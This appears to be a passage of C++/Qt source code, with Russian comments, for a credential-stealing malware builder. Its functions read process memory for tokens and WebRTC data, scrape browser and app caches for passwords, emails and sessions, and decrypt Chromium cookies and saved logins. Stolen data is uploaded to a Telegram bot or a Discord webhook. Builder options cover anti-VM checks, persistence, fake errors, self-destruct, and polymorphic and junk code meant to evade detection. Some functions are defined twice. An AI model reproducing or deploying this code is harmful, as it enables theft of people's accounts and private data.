                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "WebSocket Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log("Failed to create process snapshot for WebRTC capture");
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "WebRTC ICE Candidate: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
                                    result += "WebRTC IP: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log("Cache path not found for " + QString::fromStdString(browserName) + ": " + QString::fromStdString(cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.is_regular_file() && (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos)) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Failed to open cache file for " + QString::fromStdString(browserName) + ": " + QString::fromStdString(entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::vector<std::pair<std::regex, std::string>> patterns = {
                    {std::regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"), "Unsaved Email"},
                    {std::regex("pass(?:word)?=[^&\\s]+"), "Unsaved Password"},
                    {std::regex("\"autofill\":\"[^\"]+\""), "Autofill Data"},
                    {std::regex("sessionid=[a-zA-Z0-9]+"), "Unsaved Session"}
                };

                for (const auto& [regex, label] : patterns) {
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, regex)) {
                        result += "[" + browserName + "] " + label + ": " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Error in StealUnsavedBrowserData for " + QString::fromStdString(browserName) + ": " + QString::fromStdString(e.what()));
    }

    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        Log("Cache path not found for " + QString::fromStdString(appName) + ": " + QString::fromStdString(cachePath));
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.is_regular_file() && (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp")) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    Log("Failed to open cache file for " + QString::fromStdString(appName) + ": " + QString::fromStdString(entry.path().string()));
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::vector<std::pair<std::regex, std::string>> patterns = {
                    {std::regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}"), "Cached Token"},
                    {std::regex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}"), "Cached Email"},
                    {std::regex("sessionid=[a-zA-Z0-9]+"), "Cached Session"}
                };

                for (const auto& [regex, label] : patterns) {
                    std::smatch match;
                    std::string::const_iterator searchStart(content.cbegin());
                    while (std::regex_search(searchStart, content.cend(), match, regex)) {
                        result += "[" + appName + "] " + label + ": " + match[0].str() + "\n";
                        searchStart = match.suffix().first;
                    }
                }
            }
        }
    } catch (const std::exception& e) {
        Log("Error in StealAppCacheData for " + QString::fromStdString(appName) + ": " + QString::fromStdString(e.what()));
    }

    return result;
}

// Кража данных Chromium с улучшенной обработкой ошибок
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath, const std::string& dir) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    auto safeSqliteOpen = [&](const std::string& path, sqlite3** db) -> bool {
        if (sqlite3_open_v2(path.c_str(), db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
            Log("Failed to open database for " + QString::fromStdString(browserName) + ": " + QString::fromStdString(sqlite3_errmsg(*db)));
            sqlite3_close(*db);
            *db = nullptr;
            return false;
        }
        return true;
    };

    std::string cookiesDbPath = dbPath + "Cookies";
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        sqlite3* db = nullptr;
        if (safeSqliteOpen(cookiesDbPath, &db)) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        std::vector<std::string> criticalDomains = {
                            "mail.google.com", "outlook.com", "yahoo.com", "mail.ru", "aol.com",
                            "protonmail.com", "icloud.com", "steampowered.com", "roblox.com"
                        };
                        bool isCritical = std::any_of(criticalDomains.begin(), criticalDomains.end(),
                            [&host](const std::string& domain) { return host.find(domain) != std::string::npos; });
                        result += "[" + browserName + "] " + (isCritical ? "Critical Cookie" : "Cookie") + " (" + host + ") | " + name + " | " + value + "\n";
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log("Failed to prepare SQLite statement for cookies in " + QString::fromStdString(browserName));
            }
            sqlite3_close(db);
        }
    }

    std::string loginDbPath = dbPath + "Login Data";
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
        sqlite3* db = nullptr;
        if (safeSqliteOpen(loginDbPath, &db)) {
            sqlite3_stmt* stmt = nullptr;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { static_cast<DWORD>(sqlite3_column_bytes(stmt, 2)), const_cast<BYTE*>(static_cast<const BYTE*>(sqlite3_column_blob(stmt, 2))) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        std::vector<std::string> criticalDomains = {
                            "mail.google.com", "outlook.com", "yahoo.com", "mail.ru", "aol.com",
                            "protonmail.com", "icloud.com", "steampowered.com", "roblox.com"
                        };
                        bool isCritical = std::any_of(criticalDomains.begin(), criticalDomains.end(),
                            [&url](const std::string& domain) { return url.find(domain) != std::string::npos; });
                        result += "[" + browserName + "] " + (isCritical ? "Critical Password" : "Password") + " (" + url + ") | " + username + " | " + password + "\n";
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                Log("Failed to prepare SQLite statement for passwords in " + QString::fromStdString(browserName));
            }
            sqlite3_close(db);
        }
    }

    if (!result.empty()) {
        std::string outputFile = dir + "\\" + browserName + "_data.txt";
        std::ofstream outFile(outputFile);
        if (outFile.is_open()) {
            outFile << result;
            outFile.close();
            Log("Saved " + QString::fromStdString(browserName) + " data to: " + QString::fromStdString(outputFile));
        } else {
            Log("Failed to save " + QString::fromStdString(browserName) + " data to: " + QString::fromStdString(outputFile));
        }
    }

    return result;
}

// Реализация методов MainWindow

void MainWindow::generateEncryptionKeys() {
    const int keyLength = 32;
    const int saltLength = 16;
    std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, chars.size() - 1);

    encryptionKey1.resize(keyLength);
    encryptionKey2.resize(keyLength);
    encryptionSalt.resize(saltLength);

    for (int i = 0; i < keyLength; ++i) {
        encryptionKey1[i] = chars[dis(gen)];
        encryptionKey2[i] = chars[dis(gen)];
    }
    for (int i = 0; i < saltLength; ++i) {
        encryptionSalt[i] = chars[dis(gen)];
    }
    Log("Encryption keys and salt generated");
}

void MainWindow::appendLog(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (ui && ui->textEdit) {
        ui->textEdit->append(message);
    }
}

MainWindow::MainWindow(QWidget *parent) : QMainWindow(parent), ui(new Ui::MainWindow) {
    ui->setupUi(this);

    manager = new QNetworkAccessManager(this);
    buildTimer = new QTimer(this);
    statusCheckTimer = new QTimer(this);
    isBuilding = false;

    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);

    g_mainWindow = this;
    generateEncryptionKeys();
    loadConfig();
}

MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr;
}

// Деструктор
MainWindow::~MainWindow() {
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
    g_mainWindow = nullptr; // Обнуляем глобальный указатель
}

// Эмиссия логов с потокобезопасностью
void MainWindow::emitLog(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    emit logUpdated(message);
}

// Добавление логов в UI с потокобезопасностью
void MainWindow::appendLog(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (ui && ui->textEdit) {
        QMetaObject::invokeMethod(ui->textEdit, "append", Qt::QueuedConnection, Q_ARG(QString, message));
    }
}

// Генерация случайной строки с криптографически безопасным RNG
std::string MainWindow::generateRandomString(size_t length) {
    const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    std::string randomString(length, '\0');
    BCRYPT_ALG_HANDLE hRng;
    NTSTATUS status = BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    if (BCRYPT_SUCCESS(status)) {
        std::vector<unsigned char> buffer(length);
        status = BCryptGenRandom(hRng, buffer.data(), length, 0);
        BCryptCloseAlgorithmProvider(hRng, 0);
        if (BCRYPT_SUCCESS(status)) {
            for (size_t i = 0; i < length; ++i) {
                randomString[i] = characters[buffer[i] % characters.size()];
            }
            return randomString;
        }
    }
    Log("Failed to use BCrypt for random string, falling back to mt19937");
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, characters.size() - 1);
    for (size_t i = 0; i < length; ++i) {
        randomString[i] = characters[dis(gen)];
    }
    return randomString;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    return generateRandomString(16);
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::string key = useFirstKey ? encryptionKey1 : encryptionKey2;
    return GetStaticEncryptionKey(key);
}

// Генерация IV
std::array<unsigned char, 16> MainWindow::generateIV() {
    return GenerateIV();
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    return CheckVirtualEnvironment();
}

// Обновление конфигурации из UI
void MainWindow::updateConfigFromUI() {
    std::lock_guard<std::mutex> lock(g_mutex);
    config.telegramBotToken = ui->tokenLineEdit->text().toStdString();
    config.telegramChatId = ui->chatIdLineEdit->text().toStdString();
    config.discordWebhook = ui->discordWebhookLineEdit->text().toStdString();
    config.filename = ui->fileNameLineEdit->text().toStdString().empty() ? "output.exe" : ui->fileNameLineEdit->text().toStdString();
    config.iconPath = ui->iconPathLineEdit->text().toStdString();
    config.githubToken = ui->githubTokenLineEdit->text().toStdString();
    config.githubRepo = ui->githubRepoLineEdit->text().toStdString();
    config.sendMethod = ui->sendMethodComboBox->currentText().toStdString();
    config.buildMethod = ui->buildMethodComboBox->currentText().toStdString();
    config.steam = ui->steamCheckBox->isChecked();
    config.steamMAFile = ui->steamMAFileCheckBox->isChecked();
    config.epic = ui->epicCheckBox->isChecked();
    config.roblox = ui->robloxCheckBox->isChecked();
    config.battlenet = ui->battlenetCheckBox->isChecked();
    config.minecraft = ui->minecraftCheckBox->isChecked();
    config.discord = ui->discordCheckBox->isChecked();
    config.telegram = ui->telegramCheckBox->isChecked();
    config.chatHistory = ui->chatHistoryCheckBox->isChecked();
    config.cookies = ui->cookiesCheckBox->isChecked();
    config.passwords = ui->passwordsCheckBox->isChecked();
    config.screenshot = ui->screenshotCheckBox->isChecked();
    config.fileGrabber = ui->fileGrabberCheckBox->isChecked();
    config.stealFiles = ui->fileGrabberCheckBox->isChecked();
    config.systemInfo = ui->systemInfoCheckBox->isChecked();
    config.socialEngineering = ui->socialEngineeringCheckBox->isChecked();
    config.antiVM = ui->antiVMCheckBox->isChecked();
    config.fakeError = ui->fakeErrorCheckBox->isChecked();
    config.silent = ui->silentCheckBox->isChecked();
    config.autoStart = ui->autoStartCheckBox->isChecked();
    config.persist = ui->persistCheckBox->isChecked();
    config.selfDestruct = ui->selfDestructCheckBox->isChecked();
    config.sendToTelegram = (config.sendMethod == "Telegram");
    config.sendToDiscord = (config.sendMethod == "Discord");
    config.sendToServer = (config.sendMethod == "Local File");
}

// Сохранение конфигурации
void MainWindow::saveConfig() {
    QSettings settings("MyApp", "Config");
    settings.beginWriteArray("Config");
    settings.setValue("telegramBotToken", QString::fromStdString(config.telegramBotToken));
    settings.setValue("telegramChatId", QString::fromStdString(config.telegramChatId));
    settings.setValue("discordWebhook", QString::fromStdString(config.discordWebhook));
    settings.setValue("filename", QString::fromStdString(config.filename));
    settings.setValue("iconPath", QString::fromStdString(config.iconPath));
    settings.setValue("githubToken", QString::fromStdString(config.githubToken));
    settings.setValue("githubRepo", QString::fromStdString(config.githubRepo));
    settings.setValue("sendMethod", QString::fromStdString(config.sendMethod));
    settings.setValue("buildMethod", QString::fromStdString(config.buildMethod));
    settings.setValue("steam", config.steam);
    settings.setValue("steamMAFile", config.steamMAFile);
    settings.setValue("epic", config.epic);
    settings.setValue("roblox", config.roblox);
    settings.setValue("battlenet", config.battlenet);
    settings.setValue("minecraft", config.minecraft);
    settings.setValue("discord", config.discord);
    settings.setValue("telegram", config.telegram);
    settings.setValue("chatHistory", config.chatHistory);
    settings.setValue("cookies", config.cookies);
    settings.setValue("passwords", config.passwords);
    settings.setValue("screenshot", config.screenshot);
    settings.setValue("fileGrabber", config.fileGrabber);
    settings.setValue("systemInfo", config.systemInfo);
    settings.setValue("socialEngineering", config.socialEngineering);
    settings.setValue("antiVM", config.antiVM);
    settings.setValue("fakeError", config.fakeError);
    settings.setValue("silent", config.silent);
    settings.setValue("autoStart", config.autoStart);
    settings.setValue("persist", config.persist);
    settings.setValue("selfDestruct", config.selfDestruct);
    settings.endArray();
    Log("Configuration saved");
}

// Загрузка конфигурации
void MainWindow::loadConfig() {
    QSettings settings("MyApp", "Config");
    settings.beginReadArray("Config");
    config.telegramBotToken = settings.value("telegramBotToken", "").toString().toStdString();
    config.telegramChatId = settings.value("telegramChatId", "").toString().toStdString();
    config.discordWebhook = settings.value("discordWebhook", "").toString().toStdString();
    config.filename = settings.value("filename", "output.exe").toString().toStdString();
    config.iconPath = settings.value("iconPath", "").toString().toStdString();
    config.githubToken = settings.value("githubToken", "").toString().toStdString();
    config.githubRepo = settings.value("githubRepo", "").toString().toStdString();
    config.sendMethod = settings.value("sendMethod", "Local File").toString().toStdString();
    config.buildMethod = settings.value("buildMethod", "Local Build").toString().toStdString();
    config.steam = settings.value("steam", false).toBool();
    config.steamMAFile = settings.value("steamMAFile", false).toBool();
    config.epic = settings.value("epic", false).toBool();
    config.roblox = settings.value("roblox", false).toBool();
    config.battlenet = settings.value("battlenet", false).toBool();
    config.minecraft = settings.value("minecraft", false).toBool();
    config.discord = settings.value("discord", false).toBool();
    config.telegram = settings.value("telegram", false).toBool();
    config.chatHistory = settings.value("chatHistory", false).toBool();
    config.cookies = settings.value("cookies", false).toBool();
    config.passwords = settings.value("passwords", false).toBool();
    config.screenshot = settings.value("screenshot", false).toBool();
    config.fileGrabber = settings.value("fileGrabber", false).toBool();
    config.systemInfo = settings.value("systemInfo", false).toBool();
    config.socialEngineering = settings.value("socialEngineering", false).toBool();
    config.antiVM = settings.value("antiVM", false).toBool();
    config.fakeError = settings.value("fakeError", false).toBool();
    config.silent = settings.value("silent", false).toBool();
    config.autoStart = settings.value("autoStart", false).toBool();
    config.persist = settings.value("persist", false).toBool();
    config.selfDestruct = settings.value("selfDestruct", false).toBool();
    settings.endArray();

    std::lock_guard<std::mutex> lock(g_mutex);
    ui->tokenLineEdit->setText(QString::fromStdString(config.telegramBotToken));
    ui->chatIdLineEdit->setText(QString::fromStdString(config.telegramChatId));
    ui->discordWebhookLineEdit->setText(QString::fromStdString(config.discordWebhook));
    ui->fileNameLineEdit->setText(QString::fromStdString(config.filename));
    ui->iconPathLineEdit->setText(QString::fromStdString(config.iconPath));
    ui->githubTokenLineEdit->setText(QString::fromStdString(config.githubToken));
    ui->githubRepoLineEdit->setText(QString::fromStdString(config.githubRepo));
    ui->sendMethodComboBox->setCurrentText(QString::fromStdString(config.sendMethod));
    ui->buildMethodComboBox->setCurrentText(QString::fromStdString(config.buildMethod));
    ui->steamCheckBox->setChecked(config.steam);
    ui->steamMAFileCheckBox->setChecked(config.steamMAFile);
    ui->epicCheckBox->setChecked(config.epic);
    ui->robloxCheckBox->setChecked(config.roblox);
    ui->battlenetCheckBox->setChecked(config.battlenet);
    ui->minecraftCheckBox->setChecked(config.minecraft);
    ui->discordCheckBox->setChecked(config.discord);
    ui->telegramCheckBox->setChecked(config.telegram);
    ui->chatHistoryCheckBox->setChecked(config.chatHistory);
    ui->cookiesCheckBox->setChecked(config.cookies);
    ui->passwordsCheckBox->setChecked(config.passwords);
    ui->screenshotCheckBox->setChecked(config.screenshot);
    ui->fileGrabberCheckBox->setChecked(config.fileGrabber);
    ui->systemInfoCheckBox->setChecked(config.systemInfo);
    ui->socialEngineeringCheckBox->setChecked(config.socialEngineering);
    ui->antiVMCheckBox->setChecked(config.antiVM);
    ui->fakeErrorCheckBox->setChecked(config.fakeError);
    ui->silentCheckBox->setChecked(config.silent);
    ui->autoStartCheckBox->setChecked(config.autoStart);
    ui->persistCheckBox->setChecked(config.persist);
    ui->selfDestructCheckBox->setChecked(config.selfDestruct);

    Log("Configuration loaded");
}

// Экспорт логов
void MainWindow::exportLogs() {
    QString fileName = QFileDialog::getSaveFileName(this, "Export Logs", "", "Text Files (*.txt)");
    if (fileName.isEmpty()) return;

    QFile file(fileName);
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << ui->textEdit->toPlainText();
        file.close();
        Log("Logs exported to: " + fileName);
    } else {
        Log("Failed to export logs to: " + fileName + " (Error: " + QString::number(file.error()) + ")");
    }
}

// Обработчик кнопки выбора иконки
void MainWindow::on_iconBrowseButton_clicked() {
    QString fileName = QFileDialog::getOpenFileName(this, "Select Icon", "", "Icon Files (*.ico)");
    if (!fileName.isEmpty()) {
        ui->iconPathLineEdit->setText(fileName);
        config.iconPath = fileName.toStdString();
        Log("Icon selected: " + fileName);
    }
}

// Обработчик кнопки сборки
void MainWindow::on_buildButton_clicked() {
    updateConfigFromUI();
    if (config.buildMethod == "Local Build") {
        buildExecutable();
    } else if (config.buildMethod == "GitHub Actions") {
        triggerGitHubActions();
    } else {
        Log("Unknown build method: " + QString::fromStdString(config.buildMethod));
    }
}

// Отправка данных
void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
    if (encryptedData.isEmpty() && files.empty()) {
        Log("No data to send");
        return;
    }

    std::thread([this, encryptedData, files]() {
        if (config.sendToServer) sendDataToServer(encryptedData.toStdString(), files);
        if (config.sendToTelegram) sendToTelegram(encryptedData.toStdString(), files);
        if (config.sendToDiscord) sendToDiscord(encryptedData.toStdString(), files);
    }).detach();
}

// Отправка данных на сервер (локальный файл)
void MainWindow::sendDataToServer(const std::string& encryptedData, const std::vector<std::string>& files) {
    std::string outputDir = "output";
    std::error_code ec;
    std::filesystem::create_directory(outputDir, ec);
    if (ec) {
        Log("Failed to create output directory: " + QString::fromStdString(ec.message()));
        return;
    }

    std::string dataFile = outputDir + "\\data_" + std::to_string(GetTickCount()) + ".txt";
    std::ofstream outFile(dataFile, std::ios::binary);
    if (outFile.is_open()) {
        outFile << encryptedData;
        outFile.close();
        Log("Data saved to: " + QString::fromStdString(dataFile));
    } else {
        Log("Failed to save data to: " + QString::fromStdString(dataFile));
    }

    for (const auto& file : files) {
        std::string destPath = outputDir + "\\" + std::filesystem::path(file).filename().string();
        try {
            std::filesystem::copy_file(file, destPath, std::filesystem::copy_options::overwrite_existing, ec);
            if (!ec) {
                Log("File copied to: " + QString::fromStdString(destPath));
            } else {
                Log("Failed to copy file " + QString::fromStdString(file) + ": " + QString::fromStdString(ec.message()));
            }
        } catch (const std::exception& e) {
            Log("Exception copying file " + QString::fromStdString(file) + ": " + QString::fromStdString(e.what()));
        }
    }
}

// Отправка данных в Telegram
void MainWindow::sendToTelegram(const std::string& encryptedData, const std::vector<std::string>& files) {
    if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
        Log("Telegram bot token or chat ID not specified");
        return;
    }

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    if (!encryptedData.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"document\"; filename=\"data.txt\""));
        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
        multiPart->append(textPart);
    }

    for (const auto& filePath : files) {
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (file->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                               QVariant("form-data; name=\"document\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
            filePart.setBodyDevice(file);
            file->setParent(multiPart);
            multiPart->append(filePart);
        } else {
            Log("Failed to open file for Telegram: " + QString::fromStdString(filePath));
            delete file;
        }
    }

    QNetworkRequest request(QUrl(QString("https://api.telegram.org/bot%1/sendDocument?chat_id=%2")
                                 .arg(QString::fromStdString(config.telegramBotToken))
                                 .arg(QString::fromStdString(config.telegramChatId))));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
    });
}

// Отправка данных в Discord
void MainWindow::sendToDiscord(const std::string& encryptedData, const std::vector<std::string>& files) {
    if (config.discordWebhook.empty()) {
        Log("Discord webhook not specified");
        return;
    }

    QHttpMultiPart* multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    if (!encryptedData.empty()) {
        QHttpPart textPart;
        textPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"data.txt\""));
        textPart.setHeader(QNetworkRequest::ContentTypeHeader, QVariant("text/plain"));
        textPart.setBody(QByteArray(encryptedData.c_str(), encryptedData.size()));
        multiPart->append(textPart);
    }

    for (const auto& filePath : files) {
        QFile* file = new QFile(QString::fromStdString(filePath));
        if (file->open(QIODevice::ReadOnly)) {
            QHttpPart filePart;
            filePart.setHeader(QNetworkRequest::ContentDispositionHeader,
                               QVariant("form-data; name=\"file\"; filename=\"" + QString::fromStdString(std::filesystem::path(filePath).filename().string()) + "\""));
            filePart.setBodyDevice(file);
            file->setParent(multiPart);
            multiPart->append(filePart);
        } else {
            Log("Failed to open file for Discord: " + QString::fromStdString(filePath));
            delete file;
        }
    }

    QNetworkRequest request(QUrl(QString::fromStdString(config.discordWebhook)));
    QNetworkReply* reply = manager->post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        replyFinished(reply);
    });
}

// Обработка ответа от сети
void MainWindow::replyFinished(QNetworkReply* reply) {
    if (reply->error() == QNetworkReply::NoError) {
        Log("Data sent successfully");
    } else {
        Log("Failed to send data: " + reply->errorString());
    }
    reply->deleteLater();
}

// Генерация полиморфного кода
void MainWindow::generatePolymorphicCode() {
    std::string polyCode = GeneratePolymorphicCode();
    std::ofstream outFile("polymorphic_code.h", std::ios::binary);
    if (outFile.is_open()) {
        outFile << polyCode;
        outFile.close();
        Log("Polymorphic code generated");
    } else {
        Log("Failed to generate polymorphic code");
    }
}

// Генерация заголовка ключей
void MainWindow::generateBuildKeyHeader() {
    std::ofstream outFile("build_key.h", std::ios::binary);
    if (outFile.is_open()) {
        outFile << "#ifndef BUILD_KEY_H\n";
        outFile << "#define BUILD_KEY_H\n\n";
        outFile << "#include <array>\n";
        outFile << "#include <string>\n\n";
        outFile << "std::array<unsigned char, 16> GetStaticEncryptionKey(const std::string& key);\n";
        outFile << "std::array<unsigned char, 16> GenerateIV();\n\n";
        outFile << "#endif // BUILD_KEY_H\n";
        outFile.close();
        Log("Build key header generated");
    } else {
        Log("Failed to generate build key header");
    }
}

// Генерация мусорного кода
void MainWindow::generateJunkCode() {
    std::string junkCode = GenerateJunkCode();
    std::ofstream outFile("junk_code_generated.h", std::ios::binary);
    if (outFile.is_open()) {
        outFile << "#ifndef JUNK_CODE_GENERATED_H\n";
        outFile << "#define JUNK_CODE_GENERATED_H\n\n";
        outFile << junkCode;
        outFile << "\n#endif // JUNK_CODE_GENERATED_H\n";
        outFile.close();
        Log("Junk code generated and saved to junk_code_generated.h");
    } else {
        Log("Failed to generate junk code");
    }
}

// Копирование иконки в директорию сборки
void MainWindow::copyIconToBuild() {
    if (config.iconPath.empty()) {
        Log("No icon path specified");
        return;
    }

    std::error_code ec;
    std::filesystem::create_directory("build", ec);
    if (ec) {
        Log("Failed to create build directory: " + QString::fromStdString(ec.message()));
        return;
    }

    std::string destPath = "build\\" + std::filesystem::path(config.iconPath).filename().string();
    try {
        std::filesystem::copy_file(config.iconPath, destPath, std::filesystem::copy_options::overwrite_existing, ec);
        if (!ec) {
            Log("Icon copied to: " + QString::fromStdString(destPath));
        } else {
            Log("Failed to copy icon: " + QString::fromStdString(ec.message()));
        }
    } catch (const std::exception& e) {
        Log("Exception copying icon: " + QString::fromStdString(e.what()));
    }
}

// Сборка исполняемого файла
void MainWindow::buildExecutable() {
    updateConfigFromUI();
    if (isBuilding) {
        Log("Build already in progress");
        return;
    }

    isBuilding = true;
    Log("Starting build process...");

    std::thread([this]() {
        generatePolymorphicCode();
        generateBuildKeyHeader();
        generateJunkCode();
        copyIconToBuild();

        if (!checkDependencies()) {
            Log("Dependency check failed, aborting build");
            isBuilding = false;
            return;
        }

        std::string command = "msbuild.exe project.sln /p:Configuration=Release /p:Platform=x86";
        if (!config.iconPath.empty()) {
            command += " /p:IconFile=\"" + config.iconPath + "\"";
        }
        int result = system(command.c_str());
        if (result == 0) {
            Log("Build completed: " + QString::fromStdString(config.filename));
            emit startStealSignal();
        } else {
            Log("Build failed with error code: " + QString::number(result));
        }
